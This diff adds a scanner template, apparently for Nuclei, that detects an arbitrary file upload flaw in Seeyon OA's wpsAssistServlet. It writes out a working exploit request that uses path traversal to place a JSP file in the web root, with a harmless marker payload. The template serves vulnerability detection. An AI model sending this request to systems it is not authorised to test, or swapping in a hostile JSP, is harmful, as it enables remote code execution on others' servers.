@@ -1,0 +1,39 @@
+id: seeyon-oa-wpsAssistServlet-file-upload
+info:
+  name: Seeyon OA wpsAssistServlet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Seeyon OA is a collaborative management software. A vulnerability in the `wpsAssistServlet` interface allows arbitrary file upload due to lack of strict verification. Exploiting this can lead to remote code execution.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags:
+    - file-upload
+    - rce
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/{{filename}}&fileId=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}\r\nContent-Disposition: form-data; name="file"; filename="{{randomfile}}.txt"\r\nContent-Type: application/octet-stream\r\n\r\n{{content}}\r\n--{{boundary}}--
+    payloads:
+      filename:
+        - "testfile.jsp"
+      boundary:
+        - "Boundary{{rand_base(10)}}"
+      randomfile:
+        - "RandomFile{{rand_base(6)}}"
+      content:
+        - "<% out.println('vulnerable'); %>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerable"
